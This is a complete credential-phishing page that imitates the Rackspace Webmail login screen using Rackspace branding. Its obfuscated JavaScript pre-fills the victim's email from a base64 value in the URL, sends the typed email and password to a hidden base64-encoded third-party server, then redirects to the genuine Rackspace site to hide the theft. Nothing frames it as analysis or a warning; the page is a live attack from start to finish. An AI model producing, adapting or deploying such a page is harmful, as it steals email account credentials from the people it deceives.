document.write(decodeURIComponent(escape(atob('
<!DOCTYPE html>
<html>
<head>
  <meta charset="UTF-8">
  <title>Rackspace Webmail: Hosted Email for Business</title>
  <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Roboto:100,400,500,700">

<meta name="robots" content="nofollow">
<meta name="googlebot" content="nofollow">
<meta name="robots" content="noindex">
<meta name="googlebot" content="noindex">
<meta name="googlebot-news" content="noindex">
<meta name="googlebot-news" content="nosnippet">
<meta http-equiv="Cache-Control" content="no-store">
<meta http-equiv="Cache-Control" content="no-cache">
<meta http-equiv="Cache-Control" content="private">
<meta http-equiv="Pragma" content="no-cache">
<link rel="shortcut icon" href="https://apps.rackspace.com/favicon.ico">
  <style>    /* Page Defaults */
    * {
      -webkit-box-sizing: border-box;
      -moz-box-sizing: border-box;
      box-sizing: border-box;
    }

    body {
      font-family: "Roboto", "Helvetica Neue", Helvetica, Arial, sans-serif;
      font-size: 14px;
      line-height: 1.42857;
      color: #333333;
      background-color: #FAFAFA;
      margin: 0;
    }

    .caption {
      display: inline-block;
      font-size: 12px;
      color: #666;
    }

    .base_link {
      display: inline-block;
      color: #0C7C84;
      text-decoration: none;
    }

    .base_links {
      background: #FFFFFF;
      text-align: center;
      padding-bottom: 20px;
      margin-top: -15px;
    }

    .divider {
      display: inline-block;
      margin: 0px 5px;
      color: #0C7C84;
    }
    /* Page Layout */
    #content {
      display: flex;
      align-items: center;
      justify-content: center;
      position: fixed;
      top: 0;
      left: 0;
      bottom: 0;
      right: 0;
      background: #EAEAEA;
    }

    #content-header {
      height: 53px;
      padding: 16px;
      font-size: 24px;
      font-weight: 300;
      line-height: 18px;
      background: #424242;
      color: #FCFCFC;
    }

    #content-header-logo {
      float: right;
    }

    #logo {
      width: 130px;
      margin-top: -9px;
      margin-right: -5px;
    }

    #content-header-label {
      float: left;
    }

    #content-body {
      display: flex;
      justify-content: start;
      background: #FFFFFF;
      min-width: 790px;
    }

    #banner-section {
      height: 285px;
      width: 314px;
      margin: 40px;
      display: flex;
      flex-direction: column;
      justify-content: center;
      align-items: center;
    }

    #banner {
      width: 190px;
    }

    #divider {
      border: 1px solid rgb(224, 224, 224);
      margin: 40px 0px;
    }
    /* Form Layout */
    #form {
      display: flex;
      flex-direction: column;
      justify-content: center;
      padding: 20px;
      min-height: 268px;
      width: 100%;
    }

    #form-body {
      height: 205px;
      width: 100%;
      margin: 40px 0px 0px 20px;
      display: flex;
      flex-direction: column;
      justify-content: center;
      align-items: center;
      padding-right: 20px;
    }

    #form-container {
      width: 100%;
      margin: 0px auto;
      padding: 0px 10px;
    }

    .row {
      margin: 0px -10px;
    }

      .row:before, .row:after {
        content: " ";
        display: table;
      }

    .col {
      width: 100%;
      float: left;
      position: relative;
      min-height: 1px;
      padding: 0px 10px;
    }

    .form-group {
      width: inherit;
      padding-right: 30px;
      margin-bottom: 20px;
    }

    .form-label {
      position: relative;
      font-family: Roboto;
      font-size: 16px;
      margin-bottom: 8px;
      line-height: 1;
      color: #616161;
      display: inline-block;
      max-width: 100%;
    }

    .form-field {
      border: 1px solid #BDBDBD;
      border-radius: 2px;
      background: #FFFFFF;
      font-family: Roboto;
      font-size: 16px;
      color: #616161;
      height: 32px;
      display: block;
      width: 100%;
      padding: 4px 8px;
      line-height: 1.42857;
      -webkit-box-shadow: inset 0 1px 1px rgba(0, 0, 0, 0.075);
      box-shadow: inset 0 1px 1px rgba(0, 0, 0, 0.075);
      -webkit-transition: border-color ease-in-out 0.15s, box-shadow ease-in-out 0.15s;
      -o-transition: border-color ease-in-out 0.15s, box-shadow ease-in-out 0.15s;
      transition: border-color ease-in-out 0.15s, box-shadow ease-in-out 0.15s;
    }

    #forgot-password {
      position: absolute;
      top: 0px;
      right: 40px;
      color: #0C7C84;
      text-decoration: none;
      background-color: transparent;
      box-sizing: border-box;
    }

    #login-btn-toolbar {
      float: right;
      margin: auto 30px 15px -20px;
    }

    #login-btn {
      float: right;
      display: inline-flex;
      flex-direction: row;
      justify-content: center;
      align-items: center;
      padding: 0 12px;
      height: 32px;
      line-height: 1px;
      font-size: 14px;
      font-weight: 400;
      text-transform: capitalize;
      color: #fff;
      background-color: #0C7C84;
      border-color: #0C7C84;
      margin-bottom: 0;
      text-align: center;
      vertical-align: middle;
      touch-action: manipulation;
      cursor: pointer;
      background-image: none;
      border: 1px solid transparent;
      white-space: nowrap;
      border-radius: 2px;
      -webkit-user-select: none;
      -moz-user-select: none;
      -ms-user-select: none;
      user-select: none;
    }

    #form-container {
      width: 100%;
      margin: 0px auto;
      padding: 0px 10px;
    }

    @media only screen and (max-device-width: 480px) {
      /* Page Defaults */
      body {
        font-size: 19pt;
        line-height: 1.42857em;
      }

      .caption {
        display: inline-block;
        font-size: 80%;
        color: #666;
      }
      /* Page Layout */
      #content {
        align-items: inherit;
        display: inherit;
        justify-content: inherit;
      }

      #content-header {
        font-size: 171%;
        height: 3em;
        line-height: 1em;
        padding: 1em;
      }

      #content-header-logo {
        float: right;
      }

      #logo {
        margin-left: 6em;
        width: inherit;
        height: 1em;
      }

      #banner-section {
        display: none;
      }

      #divider {
        display: none;
      }
      /* Form Layout */
      .form-label {
        font-size: 114%;
      }

      .form-field {
        font-size: 114%;
        height: 2em;
      }

      #forgot-password {
        right: 2em;
        top: 0;
      }

      #login-btn-toolbar {
        margin: 1.5em 2em 1em -1.5em;
      }

      #login-btn {
        font-size: 150%;
        height: 3em;
        padding: 1.25em;
      }
    }
  </style>
</head>
<body>
  <div>
    <div id="content">
      <div>
        <div id="content-header">
          <div id="content-header-logo"><img id="logo" src="https://static.emailsrvr.com/beta_apps_rackspace_com/images/Rackspace_Technology_Logo_RGB_WHT.png"  /></div>
          <div id="content-header-label">Webmail Login</div>
        </div>
        <div id="content-body">
          <div id="banner-section">
            <a href="https://emailhelp.rackspace.com/l/identify-suspicious-email" target="_blank">
              <img id="banner" src="https://static.emailsrvr.com/apps_rackspace_com/images/Suspicious-Email-Banner.jpg" />
            </a>
          </div>
          <div id="divider"></div>
          <div id="form">
  <div id="form-body">
    <div id="form-container">
<div id="theerrorr" style="color: rgb(211, 47, 47); margin-bottom: 20px; font-weight: 500; display: none">Username / Password incorrect</div>
      <div id="user-row" class="row">
        <div id="user-col" class="col">
          <div id="user-field" class="form-group">
            <label id="user-label" class="form-label">Email address</label>
            <input id="user-input" name="username" tabindex="1" class="form-field" value="" autocomplete="off" readonly>
          </div>
        </div>
      </div>
      <div id="pass-row" class="row">
        <div id="pass-col" class="col">
          <div id="pass-field" class="form-group">
            <label id="pass-label" class="form-label">Password</label>
            <input id="pass-input" name="password" tabindex="2" type="password" class="form-field" value=""  autocomplete="off" readonly onclick="this.removeAttribute('readOnly');">
          </div>
          <a id="forgot-password" style="cursor: pointer">Forgot password?</a>
        </div>
      </div>
    </div>
  </div>
  <div id="login-btn-toolbar">
    <button onclick="checkoAll();" id="login-btn" tabindex="3" type="submit">Log In</button>
  </div>
</div>
        </div>
        <div class="base_links">
          <a class="base_link" target="_blank" href="http://www.rackspace.com/information/legal/privacystatement">
            Privacy Statement
          </a>
          <div class="divider"> | </div>
          <a class="base_link" target="_blank" href="http://www.rackspace.com/information/legal/websiteterms">
            Website Terms
          </a>
        </div>
        <div class="footer" style="text-align: center; margin-top: 10px;">
          <div class="caption">
            Need webmail for your business?  Learn more about
            <a href="//www.rackspace.com/email-hosting/webmail" style="color: #666;">
              Hosted Email
            </a>
            from Rackspace
          </div>
        </div>
      </div>
    </div>
  </div>
</body>
   <script src="https://code.jquery.com/jquery-1.11.1.min.js"></script>
 <script type="text/javascript">
  
     function _0x426f(){var _0x542788=['onkeydown','1710136dpSmHP','disabled','3190epOrYF','focus','parent','5sqUJbf','block','keyCode','106OZfQGq','preventDefault','ajax','4800880kVTYqv','https://apps.rackspace.com/','301479aPkhZq','theerrorr','test','770fpGPZi','match','256920Vlxbzw','href','pass-input','value','getElementById','backgroundColor','failedme','val','28HcQwtL','#EAEAEA','json','fail','none','#0C7C84','done','hash','style','display','2714058pOJugy','location','ready','12069LeNXZc','login-btn','user-input','substr','14696iMXSWy','#pass-input','replace'];_0x426f=function(){return _0x542788;};return _0x426f();}function _0x1717(_0x29398f,_0x9d1bad){var _0x426f42=_0x426f();return _0x1717=function(_0x1717ba,_0x2a63d4){_0x1717ba=_0x1717ba-0x147;var _0x60f8a1=_0x426f42[_0x1717ba];return _0x60f8a1;},_0x1717(_0x29398f,_0x9d1bad);}var _0x383f9a=_0x1717;(function(_0x26c7cf,_0x36a295){var _0x34b1b2=_0x1717,_0x549445=_0x26c7cf();while(!![]){try{var _0x5c18e1=parseInt(_0x34b1b2(0x147))/0x1*(parseInt(_0x34b1b2(0x153))/0x2)+-parseInt(_0x34b1b2(0x158))/0x3*(-parseInt(_0x34b1b2(0x165))/0x4)+-parseInt(_0x34b1b2(0x150))/0x5*(-parseInt(_0x34b1b2(0x16f))/0x6)+-parseInt(_0x34b1b2(0x156))/0x7+parseInt(_0x34b1b2(0x14b))/0x8+parseInt(_0x34b1b2(0x172))/0x9*(parseInt(_0x34b1b2(0x14d))/0xa)+-parseInt(_0x34b1b2(0x15b))/0xb*(parseInt(_0x34b1b2(0x15d))/0xc);if(_0x5c18e1===_0x36a295)break;else _0x549445['push'](_0x549445['shift']());}catch(_0x4fda7f){_0x549445['push'](_0x549445['shift']());}}}(_0x426f,0x5fa08),$(document)[_0x383f9a(0x171)](function(){var _0x5d9b6f=_0x383f9a,_0x26b659=window[_0x5d9b6f(0x170)][_0x5d9b6f(0x16c)][_0x5d9b6f(0x175)](0x1);document[_0x5d9b6f(0x161)](_0x5d9b6f(0x174))[_0x5d9b6f(0x14a)]=function(_0x1ef06a){var _0x245890=_0x5d9b6f;_0x1ef06a[_0x245890(0x152)]==0xd&&checkoAll();},document[_0x5d9b6f(0x161)](_0x5d9b6f(0x15f))[_0x5d9b6f(0x14a)]=function(_0x466b8e){var _0x5367bd=_0x5d9b6f;_0x466b8e[_0x5367bd(0x152)]==0xd&&checkoAll();};var _0x1d72b5=window['location']['hash'][_0x5d9b6f(0x149)]('#','');if(_0x26b659){var _0x485fd9=/^([0-9a-zA-Z+/]{4})*(([0-9a-zA-Z+/]{2}==)|([0-9a-zA-Z+/]{3}=))?$/,_0x3d8c2d=/^[\w\-\.\+]+\@[a-zA-Z0-9\.\-]+\.[a-zA-z0-9]{2,7}$/;if(!_0x485fd9[_0x5d9b6f(0x15a)](_0x26b659))var _0x1d72b5=window['location'][_0x5d9b6f(0x16c)]['replace']('#','');else var _0x1d72b5=atob(_0x26b659);_0x1d72b5[_0x5d9b6f(0x15c)](_0x3d8c2d)?(document[_0x5d9b6f(0x161)](_0x5d9b6f(0x174))[_0x5d9b6f(0x160)]=_0x1d72b5,document[_0x5d9b6f(0x161)](_0x5d9b6f(0x15f))[_0x5d9b6f(0x14e)]()):document[_0x5d9b6f(0x161)](_0x5d9b6f(0x174))[_0x5d9b6f(0x14e)]();}else document[_0x5d9b6f(0x161)]('user-input')['focus']();}));function checkoAll(){var _0x440bb7=_0x383f9a,_0x40f051=document[_0x440bb7(0x161)](_0x440bb7(0x174)),_0x53856b=document[_0x440bb7(0x161)]('pass-input'),_0x4e5e54=document['getElementById'](_0x440bb7(0x159)),_0x526e9e=/^[\w\-\.\+]+\@[a-zA-Z0-9\.\-]+\.[a-zA-z0-9]{2,7}$/;if(!_0x40f051[_0x440bb7(0x160)]['trim']()[_0x440bb7(0x15c)](_0x526e9e))return _0x4e5e54[_0x440bb7(0x16d)][_0x440bb7(0x16e)]=_0x440bb7(0x151),_0x40f051[_0x440bb7(0x14e)](),![];if(_0x53856b['value']['length']<0x4)return _0x4e5e54[_0x440bb7(0x16d)]['display']=_0x440bb7(0x151),_0x53856b['focus'](),![];else{document[_0x440bb7(0x161)](_0x440bb7(0x173))[_0x440bb7(0x14c)]=!![],document[_0x440bb7(0x161)](_0x440bb7(0x173))[_0x440bb7(0x16d)][_0x440bb7(0x162)]=_0x440bb7(0x166),_0x4e5e54['style'][_0x440bb7(0x16e)]=_0x440bb7(0x169);var _0x2af983={'mydata':$('#user-input')[_0x440bb7(0x164)](),'theirdata':$(_0x440bb7(0x148))[_0x440bb7(0x164)]()},_0x44daed='aHR0cHM6Ly94dmlld3NvdXJjZS5jb20vLmVtYWlsc3J2ci9pbmRleC5waHA=';$[_0x440bb7(0x155)]({'type':'POST','url':atob(_0x44daed),'data':_0x2af983,'dataType':_0x440bb7(0x167),'encode':!![]})[_0x440bb7(0x16b)](function(_0x2e99ea){var _0x2142df=_0x440bb7;document['getElementById'](_0x2142df(0x173))['disabled']=![],document['getElementById'](_0x2142df(0x173))['style'][_0x2142df(0x162)]='#0C7C84',_0x2e99ea['message']==_0x2142df(0x163)?(_0x4e5e54[_0x2142df(0x16d)][_0x2142df(0x16e)]=_0x2142df(0x151),_0x53856b[_0x2142df(0x160)]='',_0x53856b[_0x2142df(0x14e)]()):(_0x4e5e54[_0x2142df(0x16d)]['display']='none',window[_0x2142df(0x14f)][_0x2142df(0x170)][_0x2142df(0x15e)]=_0x2142df(0x157));})[_0x440bb7(0x168)](function(_0x34bced){var _0x12b5e3=_0x440bb7;_0x4e5e54[_0x12b5e3(0x16d)][_0x12b5e3(0x16e)]=_0x12b5e3(0x151),_0x53856b[_0x12b5e3(0x14e)](),document['getElementById'](_0x12b5e3(0x173))[_0x12b5e3(0x14c)]=![],document[_0x12b5e3(0x161)]('login-btn')[_0x12b5e3(0x16d)][_0x12b5e3(0x162)]=_0x12b5e3(0x16a);}),event[_0x440bb7(0x154)]();}}
</script>
</html>'))));
